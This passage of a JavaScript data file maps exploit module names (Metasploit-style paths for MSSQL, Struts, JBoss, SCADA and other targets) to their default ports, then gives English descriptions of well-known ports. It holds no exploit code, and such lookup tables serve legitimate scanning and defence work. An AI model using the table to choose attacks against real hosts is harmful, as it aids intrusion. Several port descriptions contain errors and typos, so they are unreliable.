"windows/mssql/lyris_listmanager_weak_pass" : "1433",
"windows/mssql/ms02_056_hello" : "1433",
"windows/mssql/ms09_004_sp_replwritetovarbin" : "1433",
"windows/mssql/mssql_linkcrawler" : "1433",
"windows/mssql/mssql_payload" : "1433",
"windows/mssql/ms02_039_slammer" : "1434",
"windows/oracle/tns_arguments" : "1521",
"windows/oracle/tns_auth_sesskey" : "1521",
"windows/oracle/tns_service_name" : "1521",
"windows/lotus/domino_sametime_stmux" : "1533",
"windows/http/ibm_tsm_cad_header" : "1581",
"windows/misc/ibm_tsm_cad_ping" : "1582",
"windows/misc/ibm_tsm_rca_dicugetidentify" : "1582",
"linux/pptp/poptop_negative_read" : "1723",
"windows/mmsp/ms10_025_wmss_connect_funnel" : "1755",
"windows/misc/hp_imc_uam" : "1811",
"linux/upnp/dlink_upnp_msearch_exec" : "1900",
"multi/upnp/libupnp_ssdp_overflow" : "1900",
"windows/brightstor/lgserver_multi" : "1900",
"windows/brightstor/lgserver" : "1900",
"windows/brightstor/lgserver_rxrlogin" : "1900",
"windows/brightstor/lgserver_rxssetdatagrowthscheduleandfilter" : "1900",
"windows/brightstor/lgserver_rxsuselicenseini" : "1900",
"windows/brightstor/hsmserver" : "2000",
"windows/misc/shixxnote_font" : "2000",
"windows/scada/sunway_force_control_netdbsrv" : "2001",
"windows/nfs/xlink_nfsd" : "2049",
"windows/ftp/oracle9i_xdb_ftp_pass" : "2100",
"windows/ftp/oracle9i_xdb_ftp_unlock" : "2100",
"windows/dcerpc/ms05_017_msmq" : "2103",
"windows/dcerpc/ms07_065_msmq" : "2103",
"linux/misc/hplip_hpssd_exec" : "2207",
"windows/telnet/goodtech_telnet" : "2380",
"linux/http/hp_system_management" : "2381",
"multi/http/hp_sys_mgmt_exec" : "2381",
"linux/misc/gld_postfix" : "2525",
"linux/http/gpsd_format_string" : "2947",
"windows/antivirus/symantec_rtvscan" : "2967",
"multi/http/rails_web_console_v2_code_exec" : "3000",
"windows/emc/alphastor_device_manager_exec" : "3000",
"windows/http/mdaemon_worldclient_form2raw" : "3000",
"windows/novell/file_reporter_fsfui_upload" : "3037",
"linux/misc/ib_inet_connect" : "3050",
"linux/misc/ib_jrd8_create_database" : "3050",
"linux/misc/ib_open_marker_file" : "3050",
"linux/misc/ib_pwd_db_aliased" : "3050",
"windows/misc/borland_interbase" : "3050",
"windows/misc/fb_cnct_group" : "3050",
"windows/misc/fb_isc_attach_database" : "3050",
"windows/misc/fb_isc_create_database" : "3050",
"windows/misc/fb_svc_attach" : "3050",
"windows/misc/ib_isc_attach_database" : "3050",
"windows/misc/ib_isc_create_database" : "3050",
"windows/misc/ib_svc_attach" : "3050",
"windows/misc/borland_starteam" : "3057",
"windows/proxy/proxypro_http_get" : "3128",
"windows/misc/sap_netweaver_dispatcher" : "3200",
"windows/misc/avaya_winpmd_unihostrouter" : "3217",
"linux/mysql/mysql_yassl_getname" : "3306",
"linux/mysql/mysql_yassl_hello" : "3306",
"windows/mysql/mysql_mof" : "3306",
"windows/mysql/mysql_payload" : "3306",
"windows/mysql/mysql_start_up" : "3306",
"windows/mysql/mysql_yassl_hello" : "3306",
"windows/misc/poisonivy_21x_bof" : "3460",
"windows/misc/poisonivy_bof" : "3460",
"multi/misc/persistent_hpca_radexec_exec" : "3465",
"windows/antivirus/trendmicro_serverprotect_earthagent" : "3628",
"unix/misc/distcc_exec" : "3632",
"multi/svn/svnserve_date" : "3690",
"windows/misc/hp_dataprotector_dtbclslogin" : "3817",
"windows/misc/hp_dataprotector_new_folder" : "3817",
"windows/http/altn_securitygateway" : "4000",
"windows/scada/indusoft_webstudio_exec" : "4322",
"windows/misc/avidphoneticindexer" : "4659",
"multi/http/eaton_nsm_code_exec" : "4679",
"multi/http/glassfish_deployer" : "4848",
"linux/http/synology_dsm_sliceupload_exec_noauth" : "5000",
"windows/misc/hp_ovtrace" : "5051",
"windows/sip/sipxezphone_cseq" : "5060",
"windows/sip/sipxphone_cseq" : "5060",
"windows/sip/aim_triton_cseq" : "5061",
"windows/license/sentinel_lm7_udp" : "5093",
"windows/antivirus/trendmicro_serverprotect_createbinding" : "5168",
"windows/antivirus/trendmicro_serverprotect" : "5168",
"windows/http/ca_igateway_debug" : "5250",
"linux/misc/netsupport_manager_agent" : "5405",
"linux/postgres/postgres_payload" : "5432",
"windows/postgres/postgres_payload" : "5432",
"windows/ftp/wing_ftp_admin_exec" : "5466",
"windows/misc/ibm_cognos_tm1admsd_bof" : "5498",
"windows/ftp/sasser_ftpd_port" : "5554",
"android/adb/adb_server_exec" : "5555",
"linux/misc/hp_data_protector_cmd_exec" : "5555",
"linux/upnp/miniupnpd_soap_bof" : "5555",
"multi/misc/hp_data_protector_exec_integutil" : "5555",
"multi/misc/openview_omniback_exec" : "5555",
"windows/misc/hp_dataprotector_cmd_exec" : "5555",
"windows/misc/hp_dataprotector_encrypted_comms" : "5555",
"windows/misc/hp_dataprotector_exec_bar" : "5555",
"windows/misc/hp_dataprotector_install_service" : "5555",
"windows/misc/hp_dataprotector_traversal" : "5555",
"windows/misc/hp_omniinet_1" : "5555",
"windows/misc/hp_omniinet_2" : "5555",
"windows/misc/hp_omniinet_3" : "5555",
"windows/misc/hp_omniinet_4" : "5555",
"windows/misc/vulnserver" : "5555",
"linux/misc/nagios_nrpe_arguments" : "5666",
"windows/vnc/winvnc_http_get" : "5800",
"windows/http/hp_autopass_license_traversal" : "5814",
"multi/vnc/vnc_keyboard_exec" : "5900",
"windows/winrm/winrm_script_exec" : "5985",
"unix/x11/x11_keyboard_exec" : "6000",
"windows/brightstor/universal_agent" : "6050",
"windows/brightstor/sql_agent" : "6070",
"windows/misc/bigant_server" : "6080",
"windows/backupexec/name_service" : "6101",
"solaris/dtspcd/heap_noir" : "6112",
"multi/http/manageengine_search_sqli" : "6262",
"windows/brightstor/tape_engine_0x8a" : "6502",
"windows/brightstor/tape_engine" : "6502",
"windows/brightstor/message_engine_heap" : "6503",
"windows/brightstor/message_engine" : "6503",
"windows/brightstor/ca_arcserve_342" : "6504",
"windows/brightstor/message_engine_72" : "6504",
"windows/emc/replication_manager_exec" : "6542",
"windows/misc/bigant_server_250" : "6660",
"windows/misc/bigant_server_usv" : "6660",
"windows/misc/bigant_server_dupf_upload" : "6661",
"windows/misc/bigant_server_sch_dupf_bof" : "6661",
"multi/misc/legend_bot_exec" : "6667",
"multi/misc/pbot_exec" : "6667",
"multi/misc/ra1nx_pubcall_exec" : "6667",
"multi/misc/w3tw0rk_exec" : "6667",
"multi/misc/xdh_x_exec" : "6667",
"unix/irc/unreal_ircd_3281_backdoor" : "6667",
"windows/misc/citrix_streamprocess_data_msg" : "6905",
"windows/misc/citrix_streamprocess_get_boot_record_request" : "6905",
"windows/misc/citrix_streamprocess_get_footer" : "6905",
"windows/misc/citrix_streamprocess_get_objects" : "6905",
"windows/misc/citrix_streamprocess" : "6905",
"windows/misc/ibm_director_cim_dllinject" : "6988",
"windows/http/oracle_btm_writetofile" : "7001",
"multi/http/netwin_surgeftp_exec" : "7021",
"unix/webapp/zimbra_lfi" : "7071",
"linux/http/peercast_url" : "7144",
"windows/http/peercast_url" : "7144",
"windows/misc/nvidia_mental_ray" : "7414",
"linux/misc/hp_nnmi_pmd_bof" : "7426",
"linux/http/pineapp_ldapsyncnow_exec" : "7443",
"linux/http/pineapp_livelog_exec" : "7443",
"linux/http/pineapp_test_li_conn_exec" : "7443",
"multi/http/hyperic_hq_script_console" : "7443",
"windows/http/hp_nnm_ovas" : "7510",
"windows/scada/factorylink_vrn_09" : "7579",
"windows/scada/factorylink_csservice" : "7580",
"windows/http/oracle_endeca_exec" : "7770",
"windows/backdoor/energizer_duo_payload" : "7777",
"windows/http/oracle_beehive_evaluation" : "7777",
"windows/http/oracle_beehive_prepareaudiotoplay" : "7777",
"linux/http/kloxo_sqli" : "7778",
"linux/games/ut2004_secure" : "7787",
"windows/games/ut2004_secure" : "7787",
"windows/http/cyclope_ess_sqli" : "7879",
"multi/http/splunk_mappy_exec" : "8000",
"multi/http/splunk_upload_app_exec" : "8000",
"multi/misc/java_jdwp_debugger" : "8000",
"multi/sap/sap_soap_rfc_sxpg_call_system_exec" : "8000",
"multi/sap/sap_soap_rfc_sxpg_command_exec" : "8000",
"unix/misc/qnx_qconn_exec" : "8000",
"windows/http/ezserver_http" : "8000",
"windows/http/icecast_header" : "8000",
"windows/http/miniweb_upload_wbem" : "8000",
"windows/http/shoutcast_format" : "8000",
"windows/http/steamcast_useragent" : "8000",
"multi/http/visual_mining_netcharts_upload" : "8001",
"windows/misc/lianja_db_net" : "8001",
"windows/http/edirectory_imonitor" : "8008",
"windows/http/ca_arcserve_rpc_authbypass" : "8014",
"multi/http/manage_engine_dc_pmp_sqli" : "8020",
"windows/http/desktopcentral_file_upload" : "8020",
"windows/http/desktopcentral_statusupdate_upload" : "8020",
"windows/http/manageengine_connectionid_write" : "8020",
"linux/http/pandora_fms_exec" : "8023",
"windows/http/edirectory_host" : "8028",
"linux/http/apache_continuum_cmd_exec" : "8080",
"linux/http/belkin_login_bof" : "8080",
"linux/http/struts_dmi_exec" : "8080",
"linux/http/zenoss_showdaemonxmlconfig_exec" : "8080",
"linux/misc/jenkins_java_deserialize" : "8080",
"multi/http/apache_jetspeed_file_upload" : "8080",
"multi/http/apache_roller_ognl_injection" : "8080",
"multi/http/axis2_deployer" : "8080",
"multi/http/hp_sitescope_issuesiebelcmd" : "8080",
"multi/http/hp_sitescope_uploadfileshandler" : "8080",
"multi/http/jboss_bshdeployer" : "8080",
"multi/http/jboss_deploymentfilerepository" : "8080",
"multi/http/jboss_invoke_deploy" : "8080",
"multi/http/jboss_maindeployer" : "8080",
"multi/http/jboss_seam_upload_exec" : "8080",
"multi/http/jira_hipchat_template" : "8080",
"multi/http/manageengine_auth_upload" : "8080",
"multi/http/manageengine_sd_uploader" : "8080",
"multi/http/plone_popen2" : "8080",
"multi/http/struts_code_exec_classloader" : "8080",
"multi/http/struts_code_exec_exception_delegator" : "8080",
"multi/http/struts_code_exec_parameters" : "8080",
"multi/http/struts_code_exec" : "8080",
"multi/http/struts_default_action_mapper" : "8080",
"multi/http/struts_dev_mode" : "8080",
"multi/http/struts_dmi_exec" : "8080",
"multi/http/struts_dmi_rest_exec" : "8080",
"multi/http/struts_include_params" : "8080",
"multi/http/sysaid_auth_file_upload" : "8080",
"multi/http/sysaid_rdslogs_file_upload" : "8080",
"osx/http/evocam_webserver" : "8080",
"windows/http/adobe_robohelper_authbypass" : "8080",
"windows/http/easyftp_list" : "8080",
"windows/http/ericom_access_now_bof" : "8080",
"windows/http/hp_imc_bims_upload" : "8080",
"windows/http/hp_imc_mibfileupload" : "8080",
"windows/http/hp_loadrunner_copyfiletoserver" : "8080",
"windows/http/hp_sitescope_dns_tool" : "8080",
"windows/http/hp_sitescope_runomagentcommand" : "8080",
"windows/http/jira_collector_traversal" : "8080",
"windows/http/netgear_nms_rce" : "8080",
"windows/http/novell_imanager_upload" : "8080",
"windows/http/oracle9i_xdb_pass" : "8080",
"windows/http/psoproxy91_overflow" : "8080",
"windows/http/sybase_easerver" : "8080",
"windows/http/trendmicro_officescan" : "8080",
"windows/http/zenworks_assetmgmt_uploadservlet" : "8080",
"windows/scada/codesys_web_server" : "8080",
"windows/misc/ms10_104_sharepoint" : "8082",
"multi/http/oracle_ats_file_upload" : "8088",
"windows/http/trackercam_phparg_overflow" : "8090",
"windows/http/novell_messenger_acceptlang" : "8300",
"multi/http/eventlog_file_upload" : "8400",
"windows/misc/manageengine_eventlog_analyzer_rce" : "8400",
"windows/http/sepm_auth_bypass_rce" : "8443",
"windows/http/nowsms" : "8800",
"linux/misc/accellion_fta_mpipe2" : "8812",
"multi/http/rocket_servergraph_file_requestor_rce" : "8888",
"windows/http/rabidhamster_r4_log" : "8888",
"unix/webapp/oracle_vm_agent_utl" : "8899",
"multi/http/solarwinds_store_manager_auth_filter" : "9000",
"windows/http/solarwinds_storage_manager_sql" : "9000",
"windows/http/oracle_event_processing_upload" : "9002",
"linux/ids/snortbopre" : "9080",
"multi/http/openfire_auth_bypass" : "9090",
"windows/antivirus/symantec_endpoint_manager_rce" : "9090",
"windows/http/manageengine_apps_mngr" : "9090",
"unix/misc/xerox_mfp" : "9100",
"multi/elasticsearch/script_mvel_rce" : "9200",
"multi/elasticsearch/search_groovy_script" : "9200",
"windows/misc/achat_bof" : "9256",
"windows/http/ibm_tivoli_endpoint_bof" : "9495",
"windows/http/lexmark_markvision_gfd_upload" : "9788",
"windows/antivirus/symantec_workspace_streaming_exec" : "9855",
"multi/http/uptime_file_upload_1" : "9999",
"multi/http/uptime_file_upload_2" : "9999",
"windows/http/maxdb_webdbm_database" : "9999",
"windows/http/maxdb_webdbm_get_overflow" : "9999",
"windows/http/sapdb_webtools" : "9999",
"unix/webapp/webmin_show_cgi_exec" : "10000",
"windows/backupexec/remote_agent" : "10000",
"windows/oracle/osb_ndmp_auth" : "10000",
"multi/misc/zend_java_bridge" : "10001",
"windows/misc/gimp_script_fu" : "10008",
"unix/misc/zabbix_agent_exec" : "10050",
"linux/misc/zabbix_server_exec" : "10051",
"linux/antivirus/escan_password_exec" : "10080",
"windows/brightstor/license_gcr" : "10202",
"windows/license/calicserv_getconfig" : "10202",
"windows/license/calicclnt_getconfig" : "10203",
"linux/http/efw_chpasswd_exec" : "10443",
"windows/misc/eiqnetworks_esa" : "10616",
"windows/misc/eiqnetworks_esa_topology" : "10628",
"windows/misc/bomberclone_overflow" : "11000",
"windows/scada/scadapro_cmdexe" : "11234",
"windows/misc/bcaaa_bof" : "16102",
"windows/antivirus/ams_xfr" : "12174",
"windows/games/mohaa_getinfo" : "12203",
"windows/scada/abb_wserver_exec" : "12221",
"multi/misc/indesign_server_soap" : "12345",
"windows/scada/igss_exec_17" : "12397",
"windows/scada/igss9_igssdataserver_listall" : "12401",
"windows/scada/igss9_igssdataserver_rename" : "12401",
"linux/misc/crossfire" : "13327",
"windows/lpd/wincomlpd_admin" : "13500",
"linux/misc/hp_vsa_login_bof" : "13838",
"multi/misc/hp_vsa_exec" : "13838",
"windows/http/integard_password_bof" : "18881",
"windows/misc/bopup_comm" : "19810",
"windows/scada/yokogawa_bkfsim_vhfd" : "20010",
"windows/misc/bakbone_netvault_heap" : "20031",
"windows/scada/daq_factory_bof" : "20034",
"windows/misc/trendmicro_cmdprocessor_addtask" : "20101",
"windows/scada/yokogawa_bkbcopyd_bof" : "20111",
"windows/scada/yokogawa_bkhodeq_bof" : "20171",
"windows/scada/citect_scada_odbc" : "20222",
"windows/misc/nettransport" : "22222",
"windows/misc/hp_magentservice" : "23472",
"windows/games/racer_503beta5" : "26000",
"windows/license/flexnet_lmgrd_bof" : "27000",
"linux/misc/mongod_native_helper" : "27017",
"windows/misc/sap_2005_license" : "30000",
"windows/misc/solidworks_workgroup_pdmwservice_file_write" : "30000",
"linux/misc/sercomm_exec" : "32764",
"windows/scada/yokogawa_bkesimmgr_bof" : "34205",
"windows/http/ca_totaldefense_regeneratereports" : "34443",
"windows/scada/iconics_genbroker" : "38080",
"windows/antivirus/ams_hndlrsvc" : "38292",
"windows/antivirus/symantec_iao" : "38292",
"linux/ids/alienvault_centerd_soap_exec" : "40007",
"windows/emc/alphastor_agent" : "41025",
"windows/brightstor/discovery_tcp" : "41523",
"windows/brightstor/discovery_udp" : "41524",
"windows/firewall/kerio_auth" : "44334",
"windows/scada/winlog_runtime" : "46823",
"windows/scada/winlog_runtime_2" : "46824",
"windows/http/solarwinds_fsm_userlogin" : "48080",
"linux/http/dlink_upnp_exec_noauth" : "49152",
"windows/http/sap_configservlet_exec_noauth" : "50000",
"multi/sap/sap_mgmt_con_osexec_payload" : "50013",
"linux/http/realtek_miniigd_upnp_exec_noauth" : "52869",
"windows/http/intersystems_cache" : "57772",
"windows/vpn/safenet_ike_11" : "62514",
"windows/misc/landesk_aolnsrvr" : "65535"}
};
const ports = { "PORTS_EN_US" : {
    // well known ports
	"0" : "Port 0 is reserved, but if in use by an API it may return a dynamically allocated port.",
	"1" : "Port 1 is TCP and UDP are reserved for Port Service Multiplexer or TCP MUX",
	"2" : "Port 2 is unknown.",
	"3" : "Port 3 is unknown or unassigned.",
	"4" : "Port 4 is unassigned",
	"5" : "Port 5 is remote job entry.",
	"6" : "Port 6 is unassigned.",
	"7" : "Port 7 is echo protocol.",
	"8" : "Port 8 is unsssigned.",
	"9" : "Port 9 is Wake on LAN",
	"10" : "Port 10 is unassigned.",
	"11" : "Port 11 TCP and UDP is Active Users or systat service.",
	"12" : "Port 12 is unassigned.",
	"13" : "Port 13 is daytime protocol.",
	"14" : "Port 14 is unassigned.",
	"15" : "Port 15 was formerly netstat service.",
	"16" : "Port 16 is unassigned.",
	"17" : "Port 17 is Quote of the Day.",
	"18" : "Port 18 is Message Send Protocol.",
	"19" : "Port 19 is Character Generator Protocol.",
	"20" : "Port 20 is File Transfer Protocol data transfer.",
	"21" : "Port 21 is File Transfer Protocol control and command.",
	"22" : "Port 22 is Secure Shell, Secure Copy or Secure File Transfer Protocol.",
	"23" : "Port 23 is Telnet.",
	"25" : "Port 25 is Simple Mail Transfer Protocol or SMTP.",
	"26" : "Port 26 is unassigned.",
	"37" : "Port 37 is Time Protocol.",
	"38" : "Port 38 is Route Access Protocol.",
	"39" : "Port 39 is Resource Location Protocol.",
	"40" : "Port 40 is unassigned.",
	"42" : "Port 42 is Host Name Server Protocol.",
	"43" : "Port 43 is WHOIS protocol.",
	"47" : "Port 47 is unknown.",
	"48" : "Port 48 is unknown.",
	"49" : "Port 49 is Terminal Access Controller Access-Control System plus login host protocol.",
	"50" : "Port 50 is used by Remote Mail Checking Protocol.",
	"51" : "Port 51 is reserved but 51 TCP had been previously used by Interface Message Processor.",
	"52" : "Port 52 is Xerox Network Systems Time Protcol.",
	"53" : "Port 53 is Domain Name System or DNS.",
	"54" : "Port 54 is Xerox Network Systems clearinghouse.",
	"56" : "Port 56 is Xerox Network Systems authentication.",
	"57" : "Port 57 is any private terminal access, Mail Transfer Protocol or FX-Tools Vulnerability Scanner.",
	"58" : "Port 58 is Xerox Network Systems Mail.",
	"67" : "Port 67 is assigned to Bootstrap Protocol or BOOT-P it is also used by DHCP.",
	"68" : "Port 68 is assigned to Bootstrap Protocol or BOOT-P it is also used by DHCP.",
	"69" : "Port 69 is Trivial File Transfer Protocol.",
	"70" : "Port 70 is Gopher protocol.",
	"71" : "Port 71 is NET RJS protocol.",
	"72" : "Port 72 is NET RJS protocol.",
	"73" : "Port 73 is NET RJS protocol.",
	"74" : "Port 74 is NET RJS protocol.",
	"75" : "Port 75 is Any private dial out service.",
	"77" : "Port 77 is Any private Remote job entry.",
	"79" : "Port 79 is Finger protocol.",
	"80" : "Port 80 is HTTP or QUIC which is the Google implementation of HTTP version 2.",
	"81" : "Port 81 is Tor Park onion routing.",
	"82" : "Port 82 is Tor Park control.",
	"87" : "Port 87 is any private terminal link.",
	"88" : "Port 88 is Kerberos authentication.",
	"90" : "Port 90 is DOD Network Security for Information Exchange or Secur it Attribute Token Map or Point Cast.",
	"99" : "Port 99 is WIP message protocol.",
	"100" : "Port 100 is unassigned.",
	"101" : "Port 101 TCP and UDP are used by NIC host name.",
	"102" : "Port 102 is used by ISO Transport Service Access Point or TASP.",
	"103" : "Port 103 is not reserved.",	
	"104" : "Port 104 is used by DICOM or medical digital imaging.",	
	"105" : "Port 105 is used by CCSO nameserver",
	"107" : "Port 107 is Remote User Telnet Service.",
	"108" : "Port 108 is IBM Systems Network Architecture SNA gateway access server.",
	"109" : "Port 109 is Post Office Protocol 2.",
	"110" : "Port 110 is Post Office Protocol 3.",
	"111" : "Port 111 is Open Network Computing Remote Procedure Call, ONC RPC or Sun RPC.",
	"112" : "Port 112 is Virtual Router Redundancy Protocol or VRRP.",
	"113" : "Port 113 is Ident authentication service used by IRC servers for user authentication.",
	"114" : "Port 114 is unassigned since June 2004.",
	"115" : "Port 115 is Simple File Transfer Protcol.",
	"117" : "Port 117 is U-UCP Mapping Project or path service.",
	"118" : "Port 118 is Structure Query Lanaguage.",
	"119" : "Port 119 is Network News Transfer Protocol.",
	"123" : "Port 123 is Network Time Protocol.",
	"126" : "Port 126 is NX-Edit for Unisys.",
	"135" : "Port 135 is D.C.E endpoint resolution or Microsoft End Point Mapper which is also known as R.P.C Locator Service. Port 135 is also associated with D.H.C.P. and D.N.S. and is also used by D.C.O.M.",
	"137" : "Port 137 is Net BIOS Name Service for registration and resolution.",
	"138" : "Port 138 is Net BIOS Datagram Service.",
	"139" : "Port 139 is Net BIOS Session Service.",
	"143" : "Port 143 is Internet Message Access Protocol or IMAP for e-mail.",
	"152" : "Port 152 is Background File Transfer Program.",
	"153" : "Port 153 is Simple Gateway Monitoring Protocol.",	
	"156" : "Port 156 is Structured Query Language.",
	"158" : "Port 158 is Distributed Mail System Protocol.",
	"161" : "Port 161 is Simple Network Management Protocol.",
	"162" : "Port 162 is Simple Network Management Protcol Trap.",
	"170" : "Port 170 is Print Server.",
	"177" : "Port 177 is X Display Manager Control Protocol.",
	"179" : "Port 179 is Border Gateway Protocol.",
	"194" : "Port 194 is Internet Relay Chat.",
	"199" : "Port 199 is SNMP multiplexing protocol.",
	"201" : "Port 201 is Apple Talk Routing Maintenance.",
	"209" : "Port 209 is Quick Mail Transfer Protcol.",
	"210" : "Port 210 is ANSI, Z39.50.",
	"213" : "Port 213 is Internetwork Packet Exchange.",
	"218" : "Port 218 is Message posting protocol.",
	"220" : "Port 220 is Internet Message Access Protocol V3.",
	"259" : "Port 259 is Efficient Short Remote Operations.",
	"262" : "Port 262 is Arcis-d m s",
	"264" : "Port 264 is Border Gateway Multicast Protocol.",
	"280" : "Port 280 is HTTP-management.",
	"300" : "Port 300 TCP is ThinLinc Web Access.",
	"308" : "Port 308 TCP is Novastor Online Backup.",
	"311" : "Port 311 TCP is Mac OS X Server Admin or AppleShare.",
	"318" : "Port 318 is PKIX Time Stamp Protocol.",
	"319" : "Port 319 UDP is Precision Time Protocol event messages.",
	"320" : "Port 320 UDP is Precision Time Protocol general messages.",
	"350" : "Port 350 is Mapping of Airline Traffic over Internet Protocol type A.",
	"351" : "Port 351 is Mapping of Airline Traffic over Internet Protocol type B.",
	"356" : "Port 356 is Cloanto Amiga Explorer.",
	"366" : "Port 366 is On Demand Mail Relay.",
	"369" : "Port 369 is RPC 2 Portmap.",
	"370" : "Port 370 TCP or UPD is Coda authentication server. Port 370 UDP may also be SecureCast 1.",
	"371" : "Port 371 UPD is Clear Case.",
	"383" : "Port 383 is HP data alarm manager.",
	"384" : "Port 384 is A Remote Network Server System.",
	"387" : "Port 387 is Apple Talk Update-based Routing Protocol.",
	"389" : "Port 389 is Lightweight Directory Access Protocol.",
	"399" : "Port 399 is Digital Equipment Corporation phase V plus.",
	"401" : "Port 401 is Uninterruptable power supply.",
	"427" : "Port 427 is Service Location Protocol.",
	"433" : "Port 433 is Network News Transfer Protocol or NNSP.",
	"434" : "Port 434 is Mobile IP Agent.",
	"443" : "Port 443 TCP or UDP is HTTPS. Port 443 UDP may also be QUIC.",
	"444" : "Port 444 is Simple Network Paging Protocol. Over TCP, port 444 may also be Slither.IO.",
	"445" : "Port 445 TCP is Microsoft Active Directory or SMB.",
	"464" : "Port 464 is Kerberos change password.",
	"465" : "Port 465 TCP is URL Rendezvous Directory or authenticated Simple Mail Transport Protocol Secure.",
	"475" : "Port 475 is Aladdin Knowledge Systems.",
	"491" : "Port 491 TCP is Go Global remote access.",
	"497" : "Port 497 TCP is Dantz Retrospect.",
	"500" : "Port 500 is Internet Securty Association and Key Management Protocol or Internet Key Exchange.",
	"502" : "Port 502 is Modbus Protocol.",
	"504" : "Port 504 is Citadel multi-service protcol for clients.",
	"510" : "Port 510 is First Class Protocol.",
	"512" : "Port 512 TCP is Remote Process Execution. Port 512 UDP is Comsat with Biff",
	"513" : "Port 513 TCP is Who.",
	"514" : "Port 514 TCP is Remote Shell. Port 514 UDP is Syslog.",
	"515" : "Port 515 is Line Printer Daemon print service.",
	"517" : "Port 517 UDP is Talk.",
	"518" : "Port 518 UDP is N-Talk.",
	"520" : "Port 520 TCP is Extended Filename Server. Port 520 UDP Routing Information Protocol.",
	"521" : "Port 521 UDP is Routing Information Protocol Next Generation.",
	"524" : "Port 524 is Netware Core Protocol.",
	"525" : "Port 525 is Timed or Timeserver.",
	"530" : "Port 530 is Remote Procedure Call.",
	"531" : "Port 531 is AOL Instant Messenger.",
	"532" : "Port 532 is Net News.",
	"533" : "Port 533 UDP is Netwall or For Emergency Broadcasts.",
	"540" : "Port 540 TCP is Unix-to-Unix Copy Protocol.",
	"542" : "Port 542 is Commerce Applications.",
	"543" : "Port 543 TCP is Kerberos Login.",
	"544" : "Port 544 TCP is Kerberos Remote Shell.",
	"545" : "Port 545 TCP is OSI soft PI Server Client Access.",
	"546" : "Port 546 is DHCP v6 client.",
	"547" : "Port 547 is DHCP v6 server.",
	"548" : "Port 548 TCP Apple Filling Protocol.",
	"550" : "Port 550 is new-who.",
	"560" : "Port 560 UDP is Remote Monitor.",
	"561" : "Port 561 UDP is monitor.",
	"563" : "Port 563 is NNTP over TLS.",
	"564" : "Port 564 is Plan 9.",
	"585" : "Port 585 TCP is legacy use of Internet Message Access Protocol Secure.",
	"587" : "Port 587 is email message submission. SMTP.",
	"591" : "Port 591 is FileMaker Web Sharing HTTP Alternate.",
	"593" : "Port 593 is HTTP RPC or Remote Procedure Call over HTTP.",
	"601" : "Port 601 TCP is Reliable Syslog used for system logging.",
	"604" : "Port 604 TCP is TUNNEL profile.",
	"623" : "Port 623 UDP is ASF Remote Management and Control Protocol.",
	"625" : "Port 625 TCP is Open Directory Proxy.",
	"631" : "Port 631 is Internet Printing Protocol or Common Unix Printing System.",
	"635" : "Port 635 is RLZ. D-Base.",
	"636" : "Port 636 is Lightweight Directory Access Protocol S.",
	"639" : "Port 639 is Multicast Source Discovery Protocol.",
	"641" : "Port 641 is SupportSoft Nexus Remote Command.",
	"643" : "Port 643 is SAN-ity.",
	"646" : "Port 646 is Label Distribution Protocol.",
	"647" : "Port 647 TCP is DHCP failover protocol.",
	"648" : "Port 648 TCP is Registry Registrar Protocol.",
	"651" : "Port 651 is IEEE MMS.",
	"653" : "Port 653 is SupportSoft Nexus Remote Command or a proxy gateway.",
	"654" : "Port 654 TCP is Media Management System or Media Management Protocol.",
	"655" : "Port 655 is T-inc VPN daemon.",
	"657" : "Port 657 is IBM Remote Monitoring and Control Protocol or Hardware Management Console.",
	"660" : "Port 660 is Mac OS X Server administration.",
	"666" : "Port 666 is Doom, first person shooter and port 666 UDP is also used by air-serv-NG and air-crack-NG servers for remote wireless control of devices.",
	"674" : "Port 674 TCP is Application Configuration Access Protocol.",
	"688" : "Port 688 TCP or UDP is REALM-RUSD ApplianceWare server appliance management protocol. ",
	"690" : "Port 690 TCP or UDP is Veneo Application Transfer Protocol or VATP.",
	"691" : "Port 691 TCP is Microsoft Exchange Routing.",
	"694" : "Port 694 TCP or UDP is Linux-HA or high-availability heartbeat.",
	"695" : "Port 695 TCP is IEEE Media Management System over SSL",
	"698" : "Port 698 TCP is Optimized Link State Routing or OLSR.",
	"700" : "Port 700 TCP is Extensible Provisioning Protocol or EPP. It is domain related communication between registrants and registrars.",
	"701" : "Port 701 TCP is Link Management Protocol or LMP.",
	"702" : "Port 702 TCP is Internet Registry Information Service or IRIS.",
	"706" : "Port 706 TCP is Secure Internet Live Conference or SILC.",
	"711" : "Port 711 TCP is Cisco Tag Distribution Protocol.",
	"712" : "Port 712 TCP is Topology Broadcast based on Reverse Path Forwarding routing protocol or TBRPF.",
	"749" : "Port 749 TCP  or UDP is Kerberos administration.",
	"750" : "Port 750 UDP is Kerberos version 4.",
	"751" : "Port 751 TCP or UDP is Kerberos authentication.",
	"752" : "Port 752 UDP is Kerberose password server.",
	"753" : "Port 753 TCP or UDP is Reverse Routing Header or RRH and port 753 also may host Kerberos user-reg server.",
	"754" : "Port 754 TCP or UDP is tell send or port 754 TCP may also host Kerberos 5 slave propagation.",
	"760" : "Port 760 TCP or UDP is Kerberos registration.",
	"782" : "Port 782 TCP is Conserver serial console management server.",
	"783" : "Port 783 TCP is Spam Assassin or spamd daemon.",
	"800" : "Port 800 TCP or UDP is MDBS-daemon.",
	"808" : "Port 808 TCP is Microsoft dot-Net TCP Port Sharing Service.",
	"829" : "Port 829 TCP is Certificate Management Protocol.",
	"830" : "Port 830 TCP and UDP is NETCONF over SSH.",
	"831" : "Port 831 TCP or UDP is NETCONF over BEEP.",
	"832" : "Port 832 TCP or UDP is NETCONF for SOAP over HTTPS.",
	"843" : "Port 843 TCP is Adobe Flash.",
	"847" : "Port 847 TCP is DHCP Failover Protocol.",
	"848" : "Port 848 TCP or UDP is Group Domain of Interpretation or G.D.O.I. protocol.",
	"853" : "Port 853 TCP or UDP is DNS over TLS.",
	"860" : "Port 860 TCP is iSCSI",
	"861" : "Port 861 TCP or UDP is OWAMP control.",
	"862" : "Port 862 TCP or UDP is TWAMP control. ",
	"873" : "Port 873 TCP is RSYNC file synchronization protocol.",
	"888" : "Port 888 TCP is CD Data Base protocol or it may be IBM Endpoint Manager Remote Control.",
	"897" : "Port 897 TCP or UDP is Brocade SMI-S RPC.",
	"898" : "Port 898 TCP or UDP is Brocade SMI-S RPC SSL.",
	"902" : "Port 902 TCP or UDP is VMware ESXi",
	"903" : "Port 903 TCP is VMware ESX-i",
	"914" : "Port 914 TCP is Unassigned.",
	"944" : "Port 944 UDP is Network File System service.",    
	"953" : "Port 953 TCP is BIND remote.",
	"981" : "Port 981 TCP is Remote HTTPS management for Check Point VPN 1.",
	"987" : "Port 987 TCP is Microsoft Windows SBS SharePoint.",
